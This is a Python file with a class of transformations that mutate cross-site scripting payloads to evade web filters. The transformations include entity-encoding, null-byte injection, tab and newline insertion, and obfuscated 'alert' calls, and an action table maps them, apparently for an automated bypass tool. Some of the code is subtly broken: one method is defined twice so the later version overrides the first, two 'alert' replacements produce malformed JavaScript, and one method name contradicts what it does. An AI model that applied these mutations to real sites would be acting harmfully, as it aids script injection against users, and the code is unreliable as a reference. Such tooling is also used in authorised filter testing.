import re
import base64

class ModifyPayload:
    def __init__(self):
        pass

    def apply_special_character_to_javascript(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = "&#14" + payload.replace("javascript", "$#14javascript")
            new_payloads.append(new_payload)
        return new_payloads

    def replace_spaces_with_special_char(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace(" ", "/").replace("\n", "%0A").replace("\r", "%0D")
            new_payloads.append(new_payload)
        return new_payloads

    def remove_closing_symbol(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.rstrip("/")
            new_payloads.append(new_payload)
        return new_payloads

    def add_newline_to_javascript(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("javascript", "javascript\n")
            new_payloads.append(new_payload)
        return new_payloads
    
    def add_newline_symbol_to_javascript(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("javascript", "javascript&NewLine;")
            new_payloads.append(new_payload)
        return new_payloads
    
    def add_tab_to_javascript(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("javascript", "javascript&#x09")
            new_payloads.append(new_payload)
        return new_payloads

    def double_write_html_tags(self, payloads):
        new_payloads = []
        tag_pattern = re.compile(r'(<[^>]+>)')

        for payload in payloads:
            # Use the regular expression to find and double HTML tags
            new_payload = tag_pattern.sub(lambda match: match.group(0) * 2, payload)
            new_payloads.append(new_payload)

        return new_payloads

    def replace_http_with_slashes(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("http://", "//")
            new_payloads.append(new_payload)
        return new_payloads

    def add_colon_to_javascript(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("javascript", "javascript:")
            new_payloads.append(new_payload)
        return new_payloads

    def add_space_to_javascript(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("javascript", "javascript ")
            new_payloads.append(new_payload)
        return new_payloads

    def add_string_after_script(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("</script>", "</script>/drfv/")
            new_payloads.append(new_payload)
        return new_payloads

    def replace_parentheses_with_grave_note(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("(", "`").replace(")", "`")
            new_payloads.append(new_payload)
        return new_payloads

    def remove_quotation_marks(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace('"', "")
            new_payloads.append(new_payload)
        return new_payloads
    
    def html_entity_encode_javascript(self, payloads):
        new_payloads = []
        encoded_javascript = "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;"
        for payload in payloads:
            # Replace occurrences of 'javascript' with its HTML entity encoded equivalent
            new_payload = payload.replace("javascript", encoded_javascript)
            new_payloads.append(new_payload)
        return new_payloads

    def replace_greater_than_with_less_than(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("<", ">")
            new_payloads.append(new_payload)
        return new_payloads

    def replace_alert_with_topalert(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("alert", "top'al'+'ert'")
            new_payloads.append(new_payload)
        return new_payloads

    def replace_alert_with_top8680439(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("alert", "top8680439..toString(30)")
            new_payloads.append(new_payload)
        return new_payloads

    def add_interference_string(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = "InterferenceString" + payload
            new_payloads.append(new_payload)
        return new_payloads

    def add_comment_to_tags(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = "<!--"
            new_payload += payload + "-->"
            new_payloads.append(new_payload)
        return new_payloads
    
    def replace_javascript_with_vbscript(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("javascript", "vbscript")
            new_payloads.append(new_payload)
        return new_payloads
    
    def inject_empty_byte(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("<", "%00<")
            new_payloads.append(new_payload)
        return new_payloads
    
    def replace_alert_with_topalert(self, payloads):
        new_payloads = []
        for payload in payloads:
            new_payload = payload.replace("alert", "top[/al/.source+/ert/")
            new_payloads.append(new_payload)
        return new_payloads

ACTION_TABLE = {
    "apply_special_character_to_javascript": "apply_special_character_to_javascript",
    "replace_spaces_with_special_char": "replace_spaces_with_special_char",
    "remove_closing_symbol": "remove_closing_symbol",
    "add_newline_to_javascript": "add_newline_to_javascript",
    "add_newline_symbol_to_javascript": "add_newline_symbol_to_javascript",
    "add_tab_to_javascript": "add_tab_to_javascript",
    "double_write_html_tags": "double_write_html_tags",
    "replace_http_with_slashes": "replace_http_with_slashes",
    "add_colon_to_javascript": "add_colon_to_javascript",
    "add_space_to_javascript": "add_space_to_javascript",
    "add_string_after_script": "add_string_after_script",
    "replace_parentheses_with_grave_note": "replace_parentheses_with_grave_note",
    "remove_quotation_marks": "remove_quotation_marks",
    "html_entity_encode_javascript": "html_entity_encode_javascript",
    "replace_greater_than_with_less_than": "replace_greater_than_with_less_than",
    "replace_alert_with_topalert": "replace_alert_with_topalert",
    "replace_alert_with_top8680439": "replace_alert_with_top8680439",
    "add_interference_string": "add_interference_string",
    "add_comment_to_tags": "add_comment_to_tags",
    "replace_javascript_with_vbscript": "replace_javascript_with_vbscript",
    "inject_empty_byte": "inject_empty_byte",
    "replace_alert_with_topalert": "replace_alert_with_topalert"
}